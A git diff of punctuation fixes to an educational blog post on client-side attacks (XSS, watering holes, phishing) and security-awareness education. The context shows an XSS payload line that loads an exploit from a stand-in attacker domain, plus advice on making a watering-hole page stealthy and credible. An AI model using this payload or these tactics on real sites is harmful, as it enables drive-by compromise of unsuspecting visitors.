@@ -8,12 +8,12 @@ header:
   teaser: "/assets/images/deadly_pond.jpg"
 ---
 
-Password theft, bot-net creation, life on the internet has become a wild place. While our antiviruses and firewalls do protect us against the most basic automated attacks, they are generally much less effective at protecting us from ourselves ...
+Password theft, bot-net creation, life on the internet has become a wild place. While our antiviruses and firewalls do protect us against the most basic automated attacks, they are generally much less effective at protecting us from ourselves...
 {: .text-justify}
 
 ![alt]({{ site.url }}{{ site.baseurl }}/assets/images/comics_0x0ff/0x0ffinfo_comics_reporter.png){: style="float: right; width: 200px; margin: 1em"}
 
-Nowadays there are so many different ways to take control of machines remotely. Via **SQL injections** , **Remote File Inclusion ([RFI](https://fr.wikipedia.org/wiki/Remote_File_Inclusion))** or quite simply because certain servers, applications, equipment, devices give up free access to their system, protected only by a trivial password, or worse "by default" (_therefore found in product documentation_). These configuration vulnerabilities and weaknesses are generally looked for automatically by bot armies via "**\<Insert Search Engine Here\> dorking**" or scripts performing **scan** + **fingerprinting** (_identification of OS / applications and their version_).
+Nowadays there are so many different ways to take control of machines remotely. Via **SQL injections**, **Remote File Inclusion ([RFI](https://fr.wikipedia.org/wiki/Remote_File_Inclusion))** or quite simply because certain servers, applications, equipment, devices give up free access to their system, protected only by a trivial password, or worse "by default" (_therefore found in product documentation_). These configuration vulnerabilities and weaknesses are generally looked for automatically by bot armies via "**\<Insert Search Engine Here\> dorking**" or scripts performing **scan** + **fingerprinting** (_identification of OS / applications and their version_).
 {: .text-justify}
 
 This article presents a glimpse of **client side** attacks (_**Client Side**_), which exploit our **OS** and application installed weaknesses. The peculiarity of these attacks are designed to make us pull the trigger ourselves, because yes, the main lever of this attack type is the users inadvertence and gullibility.
@@ -40,7 +40,7 @@ Usually, this attack type attempts to exploit one or more software clients (_PDF
 The attack range in companies and outside these companies is very, very wide due to the many OS and software installed varieties on the terminals (_workstations, personal computers, smartphones, connected objects, etc._) and what's more in different versions from one device to another!
 {: .text-justify}
 
-In order to operate these attacks usually need that the users carry out an action on their system or their application "in a legitimate way" (_legitimate from the point of view of the system, the anti-virus and other means of prevention installed on the workstation._), for example activate the macros of an Excel file. To do so, it seeks to exploit the credulity of humans behind the machines, therefore it is quite difficult to protect themselves effectively with purely technically automated means... Therefore benevolent education is ,in order to effectively reduce the impact of this attack type,needed for lay users.
+In order to operate these attacks usually need that the users carry out an action on their system or their application "in a legitimate way" (_legitimate from the point of view of the system, the anti-virus and other means of prevention installed on the workstation._), for example activate the macros of an Excel file. To do so, it seeks to exploit the credulity of humans behind the machines, therefore it is quite difficult to protect themselves effectively with purely technically automated means... Therefore benevolent education is, in order to effectively reduce the impact of this attack type,needed for lay users.
 {: .text-justify}
 
 In this article we will present the construction of a so-called "Watering Hole Attack". But first, it is absolutely necessary to understand what vulnerabilities are called **XSS** (_**C**ross **S**ite **S**cripting_). This will therefore be the subject of the next chapter.
@@ -52,7 +52,7 @@ In this article we will present the construction of a so-called "Watering Hole A
 {: .notice--warning}
 {: .text-justify}
 
-Hard to believe that it is the first time that we have really talked about **XSS** on this blog because these attack kinds are offensive security's 101. Hence why, when beginning to study the subject or when we usually start the challenges and **CTF** on sites like [www.newbiecontest.org](http://www.newbiecontest.org/) , [root-me.org](http://root-me.org/) , [www.hackthebox.eu](http://www.hackthebox.eu/) , we almost always start by digging the **SQL injections** and **XSS flaws**.
+Hard to believe that it is the first time that we have really talked about **XSS** on this blog because these attack kinds are offensive security's 101. Hence why, when beginning to study the subject or when we usually start the challenges and **CTF** on sites like [www.newbiecontest.org](http://www.newbiecontest.org/), [root-me.org](http://root-me.org/), [www.hackthebox.eu](http://www.hackthebox.eu/), we almost always start by digging the **SQL injections** and **XSS flaws**.
 {: .text-justify}
 
 It is a matter here of briefly presenting the basic principle of these vulnerabilities, so that the article is sufficient in itself in terms of content (_the subject is thoroughly treated, on all internets, and you can find more or less detailed technical presentations on just about any site talking about offensive security_).
@@ -86,7 +86,7 @@ For example by typing as a message:
 
 ![alt]({{ site.url }}{{ site.baseurl }}/assets/images/posts_img/XSS_example1.png){: style="margin: 1em"}
 
-The real attacker objective, being to take control of your station, rather than displaying a message "for the _lolz_" , he will instead try to use a module of his own by exploiting a vulnerability in your browser, or a key exploit. Practically talking through **BeEF** , **autopwn** or **metasploit** :
+The real attacker objective, being to take control of your station, rather than displaying a message "for the _lolz_", he will instead try to use a module of his own by exploiting a vulnerability in your browser, or a key exploit. Practically talking through **BeEF**, **autopwn** or **metasploit** :
 
 {% highlight javascript %}
 <img src = "//<pirate_domain>/autopwn" border='0'width='1' height='1'>
@@ -97,7 +97,7 @@ The countermeasure to this attack type is unfortunately the site's owner's sole 
 
 ### **XSS ON THE FLY**
 
-Now suppose that your site does not store customer data, but that on the other hand user inputs are (_and rather badly_) processed by(_usually_ _ **JavaScript** _) client-side code .
+Now suppose that your site does not store customer data, but that on the other hand user inputs are (_and rather badly_) processed by(_usually_ _ **JavaScript** _) client-side code.
 {: .text-justify}
 
 For example, imagine the following code, indicating that the none existing page:
@@ -223,18 +223,18 @@ Compiled as:
 And the wider the scope of vulnerable applications integrated into the attack, the higher the number of potential victims. For example, let's say that the targets are the conspiratorial populations browsing only the versions of **Google Chrome** version **x.b.12345** to **y.t.1337** on **Windows**, are therefore excluded all **MAC**, **Linux**, **Firefox**, **Smartphone** users, etc.
 {: .text-justify}
 
-By digging a little into the current **tools** and **frameworks** (_**metasploit**, **SE-Toolkit**, **BEEF XSS**, **autopwn**, etc._) we quickly realize that a **LOT!** many things are possible, and without necessarily great expertise ...
+By digging a little into the current **tools** and **frameworks** (_**metasploit**, **SE-Toolkit**, **BEEF XSS**, **autopwn**, etc._) we quickly realize that a **LOT!** many things are possible, and without necessarily great expertise...
 {: .text-justify}
 
 Stealth is also an essential factor, and this is again where technical quality makes the difference. The more well thought out and well hidden the attack, the less the user will suspect that there is something fishy and the less the attacked system and applications will try to defend itself. This is why finding a real vulnerable official site is generally a efficiency guarantee.
 {: .text-justify}
 
 
-**warning:** good examples of stealth and obfuscation can be found in the study of ransomware-type attacks which are often based on sending an office document (_**.docx**, **.xlsx**, **.pdf**, etc._) by email, containing macros. This code is generally obfuscated (_see_ [_Impenetrable Code_](https://fr.wikipedia.org/wiki/Code_imp%C3%A9n%C3%A9trable)) to trick **anti-virus** and other security solutions, and usually only includes two things: a custom encryption/decryption function and a download function for an encrypted malicious **payload** (_custom_). When the document is opened and the macro is used, the document gets the **payload** , decrypts it on reception and executes the attack program thus recovered.
+**warning:** good examples of stealth and obfuscation can be found in the study of ransomware-type attacks which are often based on sending an office document (_**.docx**, **.xlsx**, **.pdf**, etc._) by email, containing macros. This code is generally obfuscated (_see_ [_Impenetrable Code_](https://fr.wikipedia.org/wiki/Code_imp%C3%A9n%C3%A9trable)) to trick **anti-virus** and other security solutions, and usually only includes two things: a custom encryption/decryption function and a download function for an encrypted malicious **payload** (_custom_). When the document is opened and the macro is used, the document gets the **payload**, decrypts it on reception and executes the attack program thus recovered.
 {: .notice--warning}
 {: .text-justify}
 
-But for the watering hole to be successful, technique is not enough. It is absolutely necessary to provide a credible page that will not arouse suspicion. The best is to generate a positive but non-striking reaction so that the user forgets having accessed the page as quickly as possible and does not share it .
+But for the watering hole to be successful, technique is not enough. It is absolutely necessary to provide a credible page that will not arouse suspicion. The best is to generate a positive but non-striking reaction so that the user forgets having accessed the page as quickly as possible and does not share it.
 {: .text-justify}
 
 In the case of our conspirators it could be a random text explaining why **5G** is a technology bought from the galactic federation of the green man Oriana (_[french meme real conspiratorial celebrity](https://s.kym-cdn.com/memes/people/sylvain-durif)_). The conspirator will likely adhere to the text (_decreasing his vigilance_) and move on in search of other truths to consume.
@@ -300,16 +300,16 @@ s.quit()
 
 ## **ALL TO SAY WHAT?**
 
-Well all to say that, even if there are technical protection measures, **safety is everyone's business**. From website developer to user, including the teams in charge of their companies'**IS** , and of course security teams.
+Well all to say that, even if there are technical protection measures, **safety is everyone's business**. From website developer to user, including the teams in charge of their companies'**IS**, and of course security teams.
 {: .text-justify}
 
 Risk awareness and **IT** security education are among the keys to securing our personal and business networks and equipment. And this education can not be done only by **IT** professionals.
 {: .text-justify}
 
-It is obvious that the education of technical teams in the offensive realities is very beneficial. And we can hope that it leads to a consequent reduction in the attack surface(_technical_) thanks to the application of good practices understood by the designer (_and not just applied to pass any validation_). But we must not neglect the importance of an educated user base involved in IT security which is just as desirable, allowing to significantly reduce the impact of **client-side** attacks , **phishing** and even **social engineering**.
+It is obvious that the education of technical teams in the offensive realities is very beneficial. And we can hope that it leads to a consequent reduction in the attack surface(_technical_) thanks to the application of good practices understood by the designer (_and not just applied to pass any validation_). But we must not neglect the importance of an educated user base involved in IT security which is just as desirable, allowing to significantly reduce the impact of **client-side** attacks, **phishing** and even **social engineering**.
 {: .text-justify}
 
-Unfortunately, this education today is only carried out in the professional field (_and still not everywhere_), whereas it could be done all over the place (_in schools, in private and family circles, as well as in the public domain. , by the government, etc._). Contrary to what has been done over the past 20 years (_we will recall the_ [_Krash.in_](https://reflets.info/articles/la-justice-des-bots-c-est-maintenant)_affair in which a blogger was condemned for the sole purpose of educating people through his blog_), it is not by trying to prohibit the spread of knowledge in computer security that we effectively protect Internet users. On the contrary, the lack of visibility and the apparent ultra confidential nature of our domains (_from the point of view of the general public_) is most certainly partly responsible for the carelessness of Internet users ... This is why it seems to me beneficial to quickly offer popularized access to this culture and this knowledge, and I hope (_in vain?_) that the democratization of this knowledge will increase the level of involvement and vigilance in general.
+Unfortunately, this education today is only carried out in the professional field (_and still not everywhere_), whereas it could be done all over the place (in schools, in private and family circles, as well as in the public domain, by the government, etc.). Contrary to what has been done over the past 20 years (_we will recall the_ [_Krash.in_](https://reflets.info/articles/la-justice-des-bots-c-est-maintenant)_affair in which a blogger was condemned for the sole purpose of educating people through his blog_), it is not by trying to prohibit the spread of knowledge in computer security that we effectively protect Internet users. On the contrary, the lack of visibility and the apparent ultra confidential nature of our domains (_from the point of view of the general public_) is most certainly partly responsible for the carelessness of Internet users... This is why it seems to me beneficial to quickly offer popularized access to this culture and this knowledge, and I hope (_in vain?_) that the democratization of this knowledge will increase the level of involvement and vigilance in general.
 {: .text-justify}
 
 As for the method of transmission, I cannot help expressing a very critical opinion on the reality that I observe. This type of awareness (_in the workplace_) is often seen as a chore, or even an insult. And my gosh, it's all our fault. Let's get off our high horse, we security professionals. Popularization is desirable and learning is not done with 4 powerpoint slides and a bloated **QCM** to be completed each year, it is in-depth work. As such, it must be pleasant for the recipient of these teachings, because otherwise he picks up. Even by pointing the user, this exchange will probably be counterproductive, and the person may become actively refractory, out of a spirit of contradiction.
@@ -318,16 +318,16 @@ As for the method of transmission, I cannot help expressing a very critical opin
 To be effective, it is therefore necessary to be benevolent in our approach, and it is also essential to adapt the speech to the audience. Because we have to get used to the idea that this awareness could not be so extensive for everyone. So let's adapt our speeches to the audience. Each group: your parents, your children, technical teams, managers or users of a company **IS** in need to be treated independently on the content of these exchanges. The form must remain attractive and pleasant. It is by offering support in this progression that we will act most effectively on the global level. It is by involving and empowering users more than by constraining their uses that mentalities will evolve.
 {: .text-justify}
 
-So, if you are part of an **SEC** team , I ask you the question, have you ever thought about your methods? Are you sure you never fall into the abuse of authority or into a self-indulgent bias? Do you not sometimes, unconsciously, adopt a posture of guardian of morals and knowledge? Are you sure you are not being paternalistic and condescending in your communication? Don't you infantilize your users " _unable to use their own tools with these big twats_"? In short, are you really convinced that the vertical tutor/pupil relationship is the best method?
+So, if you are part of an **SEC Team**, I ask you the question, have you ever thought about your methods? Are you sure you never fall into the abuse of authority or into a self-indulgent bias? Do you not sometimes, unconsciously, adopt a posture of guardian of morals and knowledge? Are you sure you are not being paternalistic and condescending in your communication? Don't you infantilize your users " _unable to use their own tools with these big twats_"? In short, are you really convinced that the vertical tutor/pupil relationship is the best method?
 {: .text-justify}
 
-Personally, I am convinced that there is unease today ... Let us not be imbued with ourselves or too proud of our methods, because we are probably responsible (_at least partially_) for the epidermal reactions that computer security triggers in some ... Rightly and wrongly , we are seen by some as a somewhat sectarian and arrogant bunch of bullies ...
+Personally, I am convinced that there is unease today... Let us not be imbued with ourselves or too proud of our methods, because we are probably responsible (*at least partially*) for the epidermal reactions that computer security triggers in some... Rightly and wrongly, we are seen by some as a somewhat sectarian and arrogant bunch of bullies...
 {: .text-justify}
 
 And yet the observation is clear, the failure is bitter and there is nothing to brag about. Today, more than 20 years after the advent of the Internet for the general public, users still do not have good hygiene in using the computer tool. Worse, not all **IT** professionals have this veneer of knowledge. And how can they fight against the multitude of attacks when they are not able to identify the weapons that are opposed to them?.. Of course these principles are not necessarily taught in schools and universities (_when security is is not the subject of the training_) which is a definite lack, however we can also be singled out, because after all we may not have paddled in the right direction.
 {: .text-justify}
 
-Fortunately the trend has turned a bit on the side of **IT** professionals. Hacking and **DIY** are on the rise, offensive security has also become more accessible. Our community has grown and opened up, becoming welcoming and engaging. So a big thank you to the French actors who have made and still make this knowledge accessible: [www.newbiecontest.org](http://www.newbiecontest.org/), [root-me.org](http://root-me.org/), [La nuit du Hack](https://nuitduhack.com/), [LeHack](https://lehack.org/fr), [hackndo.com](https://beta.hackndo.com/) , [grehack.fr](https://grehack.fr/) , [reflets.info](https://reflets.info/) , [SebSauvage](https://sebsauvage.net/) , [La Quadrature du Net](https://www.laquadrature.net/), [Kali Linux Fr](https://www.kali-linux.fr/), …_I invite you to complete this list of tens (hundreds?) of links, I will update the article accordingly if you like._
+Fortunately the trend has turned a bit on the side of **IT** professionals. Hacking and **DIY** are on the rise, offensive security has also become more accessible. Our community has grown and opened up, becoming welcoming and engaging. So a big thank you to the French actors who have made and still make this knowledge accessible: [www.newbiecontest.org](http://www.newbiecontest.org/), [root-me.org](http://root-me.org/), [La nuit du Hack](https://nuitduhack.com/), [LeHack](https://lehack.org/fr), [hackndo.com](https://beta.hackndo.com/), [grehack.fr](https://grehack.fr/), [reflets.info](https://reflets.info/), [SebSauvage](https://sebsauvage.net/), [La Quadrature du Net](https://www.laquadrature.net/), [Kali Linux Fr](https://www.kali-linux.fr/), …_I invite you to complete this list of tens (hundreds?) of links, I will update the article accordingly if you like._
 {: .text-justify}
 
 _Translated from [0x0ff.info](https://www.0x0ff.info/2021/attaque-cote-client-xss-et-phishing/) by [@Razcall_](https://twitter.com/Razcall_)._
